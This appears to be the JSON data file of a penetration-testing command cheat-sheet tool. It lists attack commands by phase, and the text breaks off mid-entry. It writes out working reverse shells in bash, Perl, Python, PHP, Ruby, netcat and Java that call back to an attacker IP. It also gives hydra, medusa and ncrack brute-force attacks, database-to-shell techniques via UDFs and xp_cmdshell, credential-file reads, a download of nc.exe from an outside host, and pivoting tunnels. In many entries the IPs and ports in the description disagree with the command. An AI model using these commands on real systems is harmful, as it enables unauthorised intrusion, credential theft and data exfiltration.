{
  "Version": "1.0.0.5",
  "Categories": [
    {
      "id": 0,
      "Name": "Passive Mapping"
    },
    {
      "id": 2,
      "Name": "Web App Testing"
    },
    {
      "id": 3,
      "Name": "Interactive Mapping"
    },
    {
      "id": 4,
      "Name": "Webserver Scanning"
    },
    {
      "id": 5,
      "Name": "Vuln Scanning"
    },
    {
      "id": 6,
      "Name": "Subdomain"
    },
    {
      "id": 7,
      "Name": "Server Service Scanning"
    },
    {
      "id": 8,
      "Name": "Initial Access"
    },
    {
      "id": 9,
      "Name": "Post Exploitation"
    },
    {
      "id": 10,
      "Name": "Reverse Shells"
    },
    {
      "id": 11,
      "Name": "Spawn TTY Shell"
    },
    {
      "id": 12,
      "Name": "LDAP"
    },
    {
      "id": 13,
      "Name": "Cracking"
    },
    {
      "id": 14,
      "Name": "Misc Linux"
    },
    {
      "id": 15,
      "Name": "Powershell"
    },
    {
      "id": 16,
      "Name": "Mimikatz"
    },
    {
      "id": 17,
      "Name": "Misc Windows"
    },
    {
      "id": 18,
      "Name": "Mysql Cheats"
    },
    {
      "id": 19,
      "Name": "MSSql Cheats"
    },
    {
      "id": 20,
      "Name": "PostGres Cheats"
    },
    {
      "id": 21,
      "Name": "Metasploit Cheats"
    },
    {
      "id": 22,
      "Name": "Docker Cheats"
    },
    {
      "id": 23,
      "Name": "AWS CLI Cheats"
    },
    {
      "id": 24,
      "Name": "Tmux Cheats"
    }
  ],
  "commands": [
    {
      "Name": "Brute HTTP Login",
      "Category": 4,
      "Description": "Brute force login attempts",
      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.98 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
      "OS": "Linux"
    },
    {
      "Name": "Brute SSH Login",
      "Category": 4,
      "Description": "Brute force ssh with a wordlist",
      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 3333 ssh://192.168.51.202",
      "OS": "Linux"
    },
    {
      "Name": "Brute RDP Login",
      "Category": 4,
      "Description": "Brute force rdp with a wordlist",
      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.214.203",
      "OS": "Linux"
    },
    {
      "Name": "Brute RDP NXC",
      "Category": 4,
      "Description": "Brute force rdp with a wordlist using nxc",
      "Command": "nxc rdp 192.168.1.228 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding",
      "OS": "Linux"
    },
    {
      "Name": "Brute Basic Auth",
      "Category": 4,
      "Description": "Brute force basic auth with a wordlist",
      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.214.202 http-get",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Python TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Python",
      "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Python3 TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Python 3",
      "Command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Echo TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using echo and os.system",
      "Command": "echo os.system('/bin/bash')",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Bash TTY",
      "Category": 11,
      "Description": "Directly spawns an interactive BASH TTY shell",
      "Command": "/bin/bash -i",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Perl TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Perl",
      "Command": "perl -e 'exec \"/bin/bash\";'",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Ruby TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Ruby",
      "Command": "ruby -e 'exec \"/bin/bash\"'",
      "OS": "Linux"
    },
    {
      "Name": "Spawn Lua TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Lua",
      "Command": "lua -e 'os.execute(\"/bin/bash\")'",
      "OS": "Linux"
    },
    {
      "Name": "Spawn IRB TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using IRB",
      "Command": "exec \"/bin/bash\"",
      "OS": "Linux"
    },
    {
      "Name": "Vim Escape TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim",
      "Command": ":!bash",
      "OS": "Linux"
    },
    {
      "Name": "Vim Set Shell TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim by setting shell",
      "Command": ":set shell=/bin/bash:shell",
      "OS": "Linux"
    },
    {
      "Name": "Nano Escape TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Nano editor",
      "Command": "CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0",
      "OS": "Linux"
    },
    {
      "Name": "Nmap Escape TTY",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Nmap",
      "Command": "!bash",
      "OS": "Linux"
    },
    {
      "Name": "Export MySQL Table to File",
      "Category": 18,
      "Description": "Export a MySQL table's contents to a server-side file using SELECT INTO OUTFILE, creating a dump for exfiltration or local analysis in Linux priv-esc chains.",
      "Command": "SELECT * FROM table_name INTO OUTFILE '/tmp/dump.sql';",
      "OS": "Win/Lin"
    },
    {
      "Name": "Execute MySQL Shell UDF",
      "Category": 18,
      "Description": "Load a custom UDF to execute OS shell commands via MySQL if file privileges allow, enabling arbitrary command execution post-database compromise.",
      "Command": "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami');",
      "OS": "Win/Lin"
    },
    {
      "Name": "Load System File into MySQL",
      "Category": 18,
      "Description": "Ingest a system file like /etc/passwd into a MySQL table using LOAD DATA INFILE for enumeration of user accounts in escalated DB access.",
      "Command": "LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY ':';",
      "OS": "Win/Lin"
    },
    {
      "Name": "Export MSSQL Table to File",
      "Category": 19,
      "Description": "Export MSSQL table data to a BCP file for offline analysis, leveraging xp_cmdshell or OPENROWSET to write dumps during cross-platform priv-esc.",
      "Command": "EXEC xp_cmdshell 'bcp \"SELECT * FROM database.dbo.table_name\" queryout \"C:\\temp\\dump.txt\" -c -T';",
      "OS": "Windows"
    },
    {
      "Name": "Execute MSSQL Shell Command",
      "Category": 19,
      "Description": "Execute arbitrary OS commands on the MSSQL host using xp_cmdshell, bridging database access to system shell for Linux-like escalation from Windows.",
      "Command": "EXEC xp_cmdshell 'whoami';",
      "OS": "Windows"
    },
    {
      "Name": "Read System File into MSSQL",
      "Category": 19,
      "Description": "Incorporate Windows system files like SAM or hosts into MSSQL queries via OPENROWSET for credential or config enumeration in pivoted environments.",
      "Command": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=.;Trusted_Connection=yes;','BULK C:\\Windows\\System32\\drivers\\etc\\hosts');",
      "OS": "Windows"
    },
    {
      "Name": "Copy Postgres Table to File",
      "Category": 20,
      "Description": "Copy a PostgreSQL table's data to a CSV file on the server using COPY command, enabling file-based exfiltration in Linux priv-esc ops.",
      "Command": "COPY (SELECT * FROM table_name) TO '/tmp/dump.csv' WITH CSV HEADER;",
      "OS": "Win/Lin"
    },
    {
      "Name": "Execute Postgres Shell Command",
      "Category": 20,
      "Description": "Execute system commands via a custom PL/Python function or extension in PostgreSQL, turning DB access into shell execution for escalation.",
      "Command": "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS   import subprocess; return subprocess.check_output($1, shell=True)   LANGUAGE plpythonu; SELECT sys_exec('whoami');",
      "OS": "Win/Lin"
    },
    {
      "Name": "Read System File in Postgres",
      "Category": 20,
      "Description": "Read a system file like /etc/passwd directly into PostgreSQL output using pg_read_file, requiring superuser perms for sensitive file enumeration in priv-esc.",
      "Command": "SELECT pg_read_file('/etc/passwd');",
      "OS": "Win/Lin"
    },
    {
      "Name": "List MySQL Databases",
      "Category": 18,
      "Description": "Enumerate all accessible databases in a MySQL instance, often running as a privileged service, to identify targets for data exfiltration during Linux privilege escalation.",
      "Command": "SHOW DATABASES;",
      "OS": "Win/Lin"
    },
    {
      "Name": "Select MySQL Database",
      "Category": 18,
      "Description": "Switch to a specific database context in MySQL to prepare for table enumeration and querying, facilitating deeper reconnaissance in post-exploitation scenarios.",
      "Command": "USE database_name;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List MySQL Tables",
      "Category": 18,
      "Description": "List all tables within the current MySQL database to map schema and pinpoint sensitive data stores exploitable via escalated database access.",
      "Command": "SHOW TABLES;",
      "OS": "Win/Lin"
    },
    {
      "Name": "Describe MySQL Table Structure",
      "Category": 18,
      "Description": "Display column details for a MySQL table to understand data structure and types, aiding in targeted SQL injection or dump operations during priv-esc.",
      "Command": "DESCRIBE table_name;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List MySQL Table Columns",
      "Category": 18,
      "Description": "Retrieve column names and types from a MySQL table for schema analysis, essential for crafting precise queries in compromised database environments.",
      "Command": "SHOW COLUMNS FROM table_name;",
      "OS": "Win/Lin"
    },
    {
      "Name": "Query All MySQL Records",
      "Category": 18,
      "Description": "Query all records from a MySQL table to dump data, leveraging privileged DB access gained through Linux service exploitation for credential harvesting.",
      "Command": "SELECT * FROM table_name;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List MySQL Users",
      "Category": 18,
      "Description": "Extract user accounts from MySQL's system tables to identify high-priv users or hashes for further escalation in integrated auth scenarios.",
      "Command": "SELECT user, host FROM mysql.user;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List MySQL Processes",
      "Category": 18,
      "Description": "List active MySQL connections and queries to spot admin sessions or inject into running processes during post-exploitation pivoting.",
      "Command": "SHOW PROCESSLIST;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List MSSQL Databases",
      "Category": 19,
      "Description": "List all databases in an MSSQL instance via system views, targeting Windows-integrated services exploitable from Linux priv-esc for lateral data access.",
      "Command": "SELECT name FROM sys.databases;",
      "OS": "Windows"
    },
    {
      "Name": "Select MSSQL Database",
      "Category": 19,
      "Description": "Set the current database context in MSSQL to enable table and schema enumeration in compromised SQL Server environments during escalation chains.",
      "Command": "USE database_name;",
      "OS": "Windows"
    },
    {
      "Name": "List MSSQL Tables",
      "Category": 19,
      "Description": "Enumerate tables from MSSQL's information schema to map database structure, crucial for identifying sensitive tables post-Linux-to-Windows pivot.",
      "Command": "SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';",
      "OS": "Windows"
    },
    {
      "Name": "List MSSQL Table Columns",
      "Category": 19,
      "Description": "Query column metadata in MSSQL for a specific table to analyze data types and constraints, supporting advanced querying in priv-esc dumps.",
      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';",
      "OS": "Windows"
    },
    {
      "Name": "Query All MSSQL Records",
      "Category": 19,
      "Description": "Retrieve all rows from an MSSQL table for data exfiltration, exploiting elevated DB perms obtained via service account compromise.",
      "Command": "SELECT * FROM table_name;",
      "OS": "Windows"
    },
    {
      "Name": "List MSSQL Users",
      "Category": 19,
      "Description": "List database users in MSSQL to uncover privileged accounts or roles for credential reuse in mixed Linux-Windows privilege escalation.",
      "Command": "SELECT name FROM sys.database_principals;",
      "OS": "Windows"
    },
    {
      "Name": "List MSSQL Processes",
      "Category": 19,
      "Description": "Display active sessions and queries in MSSQL to detect and potentially hijack admin connections during post-exploitation reconnaissance.",
      "Command": "SELECT * FROM sys.dm_exec_sessions;",
      "OS": "Windows"
    },
    {
      "Name": "List Postgres Databases",
      "Category": 20,
      "Description": "List all databases in PostgreSQL using system catalogs, targeting DB services with root-like access for initial mapping in Linux priv-esc.",
      "Command": "\\l",
      "OS": "Win/Lin"
    },
    {
      "Name": "Connect Postgres Database",
      "Category": 20,
      "Description": "Connect to a specific PostgreSQL database to switch context for further enumeration, enabling schema exploration post-escalation.",
      "Command": "\\c database_name",
      "OS": "Win/Lin"
    },
    {
      "Name": "List Postgres Tables",
      "Category": 20,
      "Description": "Display tables in the current PostgreSQL schema to identify data targets, vital for dumping in compromised DB instances.",
      "Command": "\\dt",
      "OS": "Win/Lin"
    },
    {
      "Name": "Describe Postgres Table Structure",
      "Category": 20,
      "Description": "Output detailed structure of a PostgreSQL table, including columns and constraints, to inform targeted extractions during priv-esc.",
      "Command": "\\d table_name",
      "OS": "Win/Lin"
    },
    {
      "Name": "List Postgres Table Columns",
      "Category": 20,
      "Description": "Query information schema in PostgreSQL for column details to understand table layout for precise SQL operations in escalated access.",
      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';",
      "OS": "Win/Lin"
    },
    {
      "Name": "Query All Postgres Records",
      "Category": 20,
      "Description": "Fetch all records from a PostgreSQL table for data harvesting, leveraging superuser perms gained through Linux service exploits.",
      "Command": "SELECT * FROM table_name;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List Postgres Users",
      "Category": 20,
      "Description": "Enumerate PostgreSQL roles and users to spot superusers or extract hashes for auth chaining in privilege escalation workflows.",
      "Command": "SELECT rolname FROM pg_roles;",
      "OS": "Win/Lin"
    },
    {
      "Name": "List Postgres Processes",
      "Category": 20,
      "Description": "List active connections in PostgreSQL to identify ongoing sessions for potential takeover or monitoring in post-exploitation.",
      "Command": "SELECT * FROM pg_stat_activity;",
      "OS": "Win/Lin"
    },
    {
      "Name": "Forward TCP with Socat",
      "Category": 9,
      "Description": "Establish a TCP port forward using socat to listen on local port 2222 and relay connections to a remote SSH server, enabling pivoting in post-exploitation phases of Linux privilege escalation.",
      "Command": "socat -ddd TCP-LISTEN:3333,fork TCP:10.5.179.216:23",
      "OS": "Linux"
    },
    {
      "Name": "Scan SMB Ports with Netcat",
      "Category": 7,
      "Description": "Scan the 172.16.178.0/24 subnet for open SMB ports (445) using netcat to identify potential lateral movement targets during Linux priv-esc reconnaissance.",
      "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.17.179.$i 446; done",
      "OS": "Linux"
    },
    {
      "Name": "List All Processes",
      "Category": 7,
      "Description": "List all running processes with user details to identify running services, potential injection points, and privilege mismatches for escalation.",
      "Command": "ps aux",
      "OS": "Linux"
    },
    {
      "Name": "Show Socket Status",
      "Category": 7,
      "Description": "Scan active network sockets and associated processes to detect listening services and connections for service enumeration in escalation.",
      "Command": "ss -anp",
      "OS": "Linux"
    },
    {
      "Name": "Test Port Connectivity Powershell",
      "Category": 7,
      "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
      "Command": "Test-NetConnection -Port 26 192.169.51.9",
      "OS": "Windows"
    },
    {
      "Name": "Scan UDP SNMP Ports",
      "Category": 7,
      "Description": "Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt",
      "Command": "sudo nmap -sU --open -p 162 192.169.51.1-254 -oG open-snmp.txt",
      "OS": "Linux"
    },
    {
      "Name": "Brute SNMP Communities",
      "Category": 7,
      "Description": "Performs SNMP community string brute-forcing using a community list against specified IPs",
      "Command": "onesixtyone -c community -i ips",
      "OS": "Linux"
    },
    {
      "Name": "Walk Public SNMP",
      "Category": 7,
      "Description": "Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1",
      "Command": "snmpwalk -c public -v1 -t 10 192.169.51.152",
      "OS": "Linux"
    },
    {
      "Name": "Enum LAN Users SNMP",
      "Category": 7,
      "Description": "Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25",
      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.4.1.77.1.2.25",
      "OS": "Linux"
    },
    {
      "Name": "List Processes SNMP",
      "Category": 7,
      "Description": "Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2",
      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.25.4.2.1.2",
      "OS": "Linux"
    },
    {
      "Name": "List Software SNMP",
      "Category": 7,
      "Description": "Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2",
      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.25.6.3.1.2",
      "OS": "Linux"
    },
    {
      "Name": "List TCP SNMP",
      "Category": 7,
      "Description": "Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3",
      "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.6.13.1.3",
      "OS": "Linux"
    },
    {
      "Name": "Connect Telnet SMTP",
      "Category": 7,
      "Description": "Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8",
      "Command": "telnet 192.169.51.9 26",
      "OS": "Win/Lin"
    },
    {
      "Name": "Connect Netcat SMTP",
      "Category": 7,
      "Description": "Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output",
      "Command": "nc -nv 192.169.51.9 26",
      "OS": "Win/Lin"
    },
    {
      "Name": "Scan Multiple Enum4linux",
      "Category": 7,
      "Description": "Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet",
      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.169.193.$i ; done",
      "OS": "Linux"
    },
    {
      "Name": "Verbose Enum4linux Scan",
      "Category": 7,
      "Description": "Runs enum4linux in verbose mode to show underlying commands",
      "Command": "enum4linux -v target-ip",
      "OS": "Linux"
    },
    {
      "Name": "Full Enum4linux Scan",
      "Category": 7,
      "Description": "Runs all enum4linux options except dictionary-based share name guessing",
      "Command": "enum4linux -a target-ip",
      "OS": "Linux"
    },
    {
      "Name": "List Users Enum4linux",
      "Category": 7,
      "Description": "Lists usernames if the server allows (RestrictAnonymous = 0)",
      "Command": "enum4linux -U target-ip",
      "OS": "Linux"
    },
    {
      "Name": "List Users Creds",
      "Category": 7,
      "Description": "Lists all users using provided credentials, bypassing RestrictAnonymous",
      "Command": "enum4linux -u administrator -p password -U target-ip",
      "OS": "Linux"
    },
    {
      "Name": "Default RID Enum",
      "Category": 7,
      "Description": "Pulls usernames from default RID range (500-550,1000-1050)",
      "Command": "enum4linux -r target-ip",
      "OS": "Linux"
    },
    {
      "Name": "Custom RID Enum",
      "Category": 7,
      "Description": "Pulls usernames using a custom RID range (600-660)",
      "Command": "enum4linux -R 600-660 target-ip",
      "OS": "Linux"
    },
    {
      "Name": "List Groups Enum4linux",
      "Category": 7,
      "Description": "Lists groups, with optional username and password support",
      "Command": "enum4linux -G target-ip",
      "OS": "Linux"
    },
    {
      "Name": "List Shares Enum4linux",
      "Category": 7,
      "Description": "Lists Windows shares, with optional username and password support",
      "Command": "enum4linux -S target-ip",
      "OS": "Linux"
    },
    {
      "Name": "Dict Attack Shares",
      "Category": 7,
      "Description": "Performs dictionary attack on shares if share list retrieval is blocked",
      "Command": "enum4linux -s shares.txt target-ip",
      "OS": "Linux"
    },
    {
      "Name": "Get OS Info Enum",
      "Category": 7,
      "Description": "Pulls OS information using smbclient, including service pack version",
      "Command": "enum4linux -o target-ip",
      "OS": "Linux"
    },
    {
      "Name": "List Printers Enum",
      "Category": 7,
      "Description": "Pulls information about printers known to the target device",
      "Command": "enum4linux -i target-ip",
      "OS": "Linux"
    },
    {
      "Name": "View Domain Shares",
      "Category": 7,
      "Description": "Lists all shared resources on the target domain controller dc01",
      "Command": "net view \\dc01 /all",
      "OS": "Windows"
    },
    {
      "Name": "Discover SMB OS",
      "Category": 7,
      "Description": "Scans for SMB services on ports 139 and 445 with OS discovery script on a single host",
      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.169.51.153",
      "OS": "Linux"
    },
    {
      "Name": "Scan NetBIOS Names",
      "Category": 7,
      "Description": "Scans for NetBIOS information on the 192.168.50.0/24 network",
      "Command": "sudo nbtscan -r 192.169.51.0/24",
      "OS": "Linux"
    },
    {
      "Name": "Scan SMB Ports",
      "Category": 7,
      "Description": "Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt",
      "Command": "nmap -v -p 139,445 -oG smb.txt 192.169.51.1-254",
      "OS": "Linux"
    },
    {
      "Name": "SYN Port Scan",
      "Category": 7,
      "Description": "Port scanning with nmap",
      "Command": "nmap -sS 192.169.193.2",
      "OS": "Linux"
    },
    {
      "Name": "Scan Ports Netcat",
      "Category": 7,
      "Description": "Port scanning with netcat",
      "Command": "nc -nvv -w1 -z 192.169.193.152 1-1000",
      "OS": "Win/Lin"
    },
    {
      "Name": "UDP Scan Netcat",
      "Category": 7,
      "Description": "UDP Port scanning with netcat",
      "Command": "nc -nvv -u -w1 -z 192.169.193.152 150-200",
      "OS": "Win/Lin"
    },
    {
      "Name": "Run Enum4linux",
      "Category": 7,
      "Description": "SMB enumeration",
      "Command": "enum4linux -a 10.10.11.25",
      "OS": "Linux"
    },
    {
      "Name": "List SMB Shares",
      "Category": 7,
      "Description": "List SMB shares",
      "Command": "smbclient -L \\\\10.10.11.25 -U anonymous",
      "OS": "Linux"
    },
    {
      "Name": "Scan SMB Vulns",
      "Category": 7,
      "Description": "SMB vulnerability scan",
      "Command": "nmap --script smb-vuln* -p 445 10.10.11.25",
      "OS": "Linux"
    },
    {
      "Name": "Map SMB Shares",
      "Category": 7,
      "Description": "SMB share mapping",
      "Command": "smbmap -H 10.10.11.25 -u guest -p \"\"",
      "OS": "Linux"
    },
    {
      "Name": "Brute SMB Medusa",
      "Category": 7,
      "Description": "Brute force SMB with medusa",
      "Command": "medusa -h 10.10.11.25 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F",
      "OS": "Linux"
    },
    {
      "Name": "Brute SMB Hydra",
      "Category": 7,
      "Description": "Brute force SMB with hydra",
      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.25 smb",
      "OS": "Linux"
    },
    {
      "Name": "Brute SMB Ncrack",
      "Category": 7,
      "Description": "Brute force SMB with ncrack",
      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.17",
      "OS": "Linux"
    },
    {
      "Name": "Enum RPC Nmap",
      "Category": 7,
      "Description": "RPC enumeration with nmap",
      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.3",
      "OS": "Linux"
    },
    {
      "Name": "Connect RPC Client",
      "Category": 7,
      "Description": "RPC client enumeration",
      "Command": "rpcclient -U \"\" 10.10.11.25",
      "OS": "Linux"
    },
    {
      "Name": "Enum SMTP Users",
      "Category": 7,
      "Description": "SMTP user enumeration",
      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.15",
      "OS": "Linux"
    },
    {
      "Name": "Brute SMTP Medusa",
      "Category": 7,
      "Description": "Brute force SMTP with medusa",
      "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25",
      "OS": "Linux"
    },
    {
      "Name": "Query DNS Records",
      "Category": 7,
      "Description": "DNS record lookup",
      "Command": "dig <domain> -t any",
      "OS": "Linux"
    },
    {
      "Name": "SSH Local Port Forward",
      "Category": 9,
      "Description": "Set up an SSH local port forward to tunnel traffic from local port 4455 to a remote SMB service via a jump host, facilitating access to internal networks post-Linux escalation.",
      "Command": "ssh -N -L 0.0.0.0:5566:172.17.179.218:445 dbadmin@10.5.179.216",
      "OS": "Linux"
    },
    {
      "Name": "Bash Reverse Shell",
      "Category": 10,
      "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation",
      "Command": "bash -i >& /dev/tcp/192.168.1.100/9080 0>&1",
      "OS": "Linux"
    },
    {
      "Name": "Perl Reverse Shell",
      "Category": 10,
      "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
      "Command": "perl -e 'use Socket;$i=\"192.168.1.100\";$p=2234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      "OS": "Win/Lin"
    },
    {
      "Name": "Python Reverse Shell",
      "Category": 10,
      "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",2234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      "OS": "Win/Lin"
    },
    {
      "Name": "PHP Reverse Shell",
      "Category": 10,
      "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation",
      "Command": "php -r '$sock=fsockopen(\"192.168.1.100\",2234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      "OS": "Win/Lin"
    },
    {
      "Name": "Ruby Reverse Shell",
      "Category": 10,
      "Description": "A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"192.168.1.100\",2234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      "OS": "Win/Lin"
    },
    {
      "Name": "Netcat Reverse Shell",
      "Category": 10,
      "Description": "A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation",
      "Command": "nc -e /bin/sh 192.168.1.100 2234",
      "OS": "Win/Lin"
    },
    {
      "Name": "Netcat FIFO Shell",
      "Category": 10,
      "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation",
      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 2234 >/tmp/f",
      "OS": "Linux"
    },
    {
      "Name": "Java Reverse Shell",
      "Category": 10,
      "Description": "A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation",
      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/192.168.1.100/3002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
      "OS": "Win/Lin"
    },
    {
      "Name": "Xterm Reverse Shell",
      "Category": 10,
      "Description": "An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation",
      "Command": "xterm -display 192.168.1.100:2",
      "OS": "Linux"
    },
    {
      "Name": "Start Xnest Server",
      "Category": 10,
      "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation",
      "Command": "Xnest :2",
      "OS": "Linux"
    },
    {
      "Name": "Authorize Xhost Target",
      "Category": 10,
      "Description": "Authorizes the target to connect to your X-Server (run on your system)",
      "Command": "xhost +targetip",
      "OS": "Linux"
    },
    {
      "Name": "SSH Dynamic SOCKS Proxy",
      "Category": 9,
      "Description": "Create a dynamic SOCKS proxy via SSH on local port 9999 for routing traffic through a compromised host, aiding in anonymous pivoting after Linux privilege escalation.",
      "Command": "ssh -N -D 0.0.0.0:8888 dbadmin@10.5.179.216",
      "OS": "Linux"
    },
    {
      "Name": "SSH Remote SSH Forward",
      "Category": 9,
      "Description": "Configure an SSH remote port forward to expose a local SSH service on the remote host's port 2222, enabling inbound connections for further exploitation in Linux post-exploitation.",
      "Command": "ssh -N -R 127.0.0.1:3333:10.5.51.216:23 kali@192.169.119.5",
      "OS": "Linux"
    },
    {
      "Name": "SSH Remote Proxy Forward",
      "Category": 9,
      "Description": "Initiate an SSH remote port forward on port 9997 for proxy chaining, supporting persistent access and tool routing in Linux privilege escalation scenarios.",
      "Command": "ssh -N -R 8886 kali@192.169.46.160 #remember to update proxy chains to 127.0.0.1 8886",
      "OS": "Linux"
    },
    {
      "Name": "SSHuttle Subnet Tunnel",
      "Category": 9,
      "Description": "Deploy sshuttle to create a VPN-like tunnel over SSH for specified subnets, allowing seamless traffic routing and lateral movement post-Linux escalation.",
      "Command": "sshuttle -r database_admin@192.169.51.64:3333 10.5.179.0/24 172.17.179.0/24",
      "OS": "Linux"
    },
    {
      "Name": "SSH Basic Remote Forward",
      "Category": 9,
      "Description": "Establish a basic SSH remote port forward on port 9997 to bridge networks and maintain access channels during Linux post-exploitation activities.",
      "Command": "ssh -N -R 8886 kali@192.169.46.160",
      "OS": "Linux"
    },
    {
      "Name": "Plink RDP Port Forward",
      "Category": 17,
      "Description": "Use Plink to set up a remote port forward for RDP on port 9833, enabling Windows lateral movement from a Linux-compromised pivot in mixed-environment priv-esc chains.",
      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:8722:127.0.0.1:4490 192.169.46.160",
      "OS": "Windows"
    },
    {
      "Name": "Download Netcat Executable",
      "Category": 17,
      "Description": "Download a netcat executable to a Windows temp directory using PowerShell wget, preparing for reverse shell or scanning tools in cross-platform Linux-to-Windows escalation.",
      "Command": "wget -Uri http://192.169.46.160/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe",
      "OS": "Windows"
    },
    {
      "Name": "Add Windows Port Proxy",
      "Category": 17,
      "Description": "Configure a Windows port proxy rule with netsh to forward traffic from local port 4545 to a remote host, supporting tunneling in post-exploitation from Linux pivots.",
      "Command": "netsh interface portproxy add v4tov4 listenport=5656 listenaddress=192.169.179.65 connectport=5656 connectaddress=10.5.179.216",
      "OS": "Windows"
    },
    {
      "Name": "List Windows Port Proxies",
      "Category": 17,
      "Description": "Display all configured port proxy rules on Windows to verify forwarding setups during mixed Linux-Windows privilege escalation verification.",
      "Command": "netsh interface portproxy show all",
      "OS": "Windows"
    },
    {
      "Name": "Check Specific Port Status",
      "Category": 14,
